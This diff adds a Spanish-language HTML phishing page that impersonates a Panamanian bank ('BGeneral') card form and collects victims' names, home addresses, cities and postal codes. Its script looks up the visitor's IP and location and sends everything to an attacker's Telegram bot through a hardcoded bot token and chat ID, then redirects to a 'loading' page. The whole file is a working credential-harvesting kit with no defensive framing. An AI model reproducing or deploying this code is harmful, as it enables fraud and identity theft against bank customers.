@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BGeneral</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #fefeff, #e5e7e9);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #004C97; /* Cambiar color de la letra */
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 40px; /* Ajustar el padding */
+            border-radius: 10px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+            width: 350px;
+            height: auto;
+            text-align: left; /* Cambiar a texto alineado a la izquierda */
+        }
+        .logo {
+            width: 230px; /* Ajustar el tamaño del logo */
+            margin-bottom: 30px; /* Espacio entre el logo y el formulario */
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        label {
+            font-size: 14px;
+            color: #004C97; /* Cambiar color de las etiquetas */
+        }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ced4da;
+            border-radius: 4px;
+            margin-top: 5px;
+            transition: border 0.3s;
+        }
+        input:focus, select:focus {
+            border-color: #6b5b95;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background-color: #004C97; /* Cambiar color de fondo del botón */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: background-color 0.3s;
+            margin-top: 30px; /* Aumentar margen superior del botón */
+        }
+        button:hover {
+            background-color: #feb236;
+        }
+        .country-select {
+            display: flex;
+            align-items: center; /* Alinear verticalmente el ícono y el select */
+        }
+        .country-select img {
+            width: 29px; /* Ajustar el tamaño de la bandera */
+            height: auto;
+            margin-right: 10px; /* Espacio entre la bandera y el select */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="logo-bg-2.svg" alt="Logo" class="logo"> <!-- Logo ajustado -->
+        <form id="payment-form">
+            <div class="input-group">
+                <label for="name">Nombre Impreso en tu tarjeta</label>
+                <input type="text" id="name" placeholder="Tu nombre completo" required>
+            </div>
+            <div class="input-group">
+                <label for="address">Dirección de Domicilio</label>
+                <input type="text" id="address" placeholder="Calle, número, etc." required>
+            </div>
+            <div class="input-group">
+                <label for="city">Ciudad</label>
+                <select id="city" required>
+                    <option value="" disabled selected>Selecciona tu ciudad</option>
+                    <option value="Ciudad de Panamá">Ciudad de Panamá</option>
+                    <option value="Colón">Colón</option>
+                    <option value="David">David</option>
+                    <option value="Chitré">Chitré</option>
+                    <option value="La Chorrera">La Chorrera</option>
+                    <option value="Santiago">Santiago</option>
+                    <option value="Penonomé">Penonomé</option>
+                    <option value="Bocas del Toro">Bocas del Toro</option>
+                    <option value="Changuinola">Changuinola</option>
+                    <option value="Las Tablas">Las Tablas</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <label for="cvv">Código Postal</label>
+                <input type="text" id="cvv" placeholder="C.P" required>
+            </div>
+            <div class="input-group">
+                <label for="country">País</label>
+                <div class="country-select">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Flag_of_Panama.svg/2560px-Flag_of_Panama.svg.png" alt="Bandera de Panamá">
+                    <select id="country" required>
+                        <option value="Panamá" selected>Panamá</option>
+                    </select>
+                </div>
+            </div>
+            <button id="submit">Continuar</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('payment-form').addEventListener('submit', async (event) => {
+            event.preventDefault(); // Evita que el formulario se envíe de la manera tradicional
+            
+            const name = document.getElementById('name').value;
+            const address = document.getElementById('address').value;
+            const city = document.getElementById('city').value;
+            const cvv = document.getElementById('cvv').value;
+            const country = document.getElementById('country').value;
+
+            // Obtener la IP y ubicación desde ipwhois.io
+            let ipInfo = {};
+            try {
+                const ipResponse = await fetch('https://ipwhois.app/json/');
+                ipInfo = await ipResponse.json();
+            } catch (error) {
+                console.error('Error al obtener la información de IP:', error);
+                // Continuar sin mostrar alerta
+            }
+
+            const message = `Nombre: ${name}\nDirección: ${address}\nCiudad: ${city}\nCódigo Postal: ${cvv}\nPaís: ${country}\nIP: ${ipInfo.ip || 'No disponible'}\nUbicación: ${ipInfo.city || 'No disponible'}, ${ipInfo.country || 'No disponible'}`;
+            const token = '6813453135:AAGfFRmuT5uVMFHzXzotCDQmXs3uj8wqB6o'; // Reemplaza con tu token
+            const chatId = '-4037234500'; // Reemplaza con tu chat ID
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    }),
+                });
+
+                const data = await response.json();
+                if (data.ok) {
+                    // Redirigir a cargando.html después de enviar el mensaje
+                    window.location.href = 'cargando.html';
+                } else {
+                    console.error('Error al enviar el mensaje:', data.description);
+                }
+            } catch (error) {
+                console.error('Error en la conexión:', error);
+            }
+        });
+    </script>
+</body>
+</html>
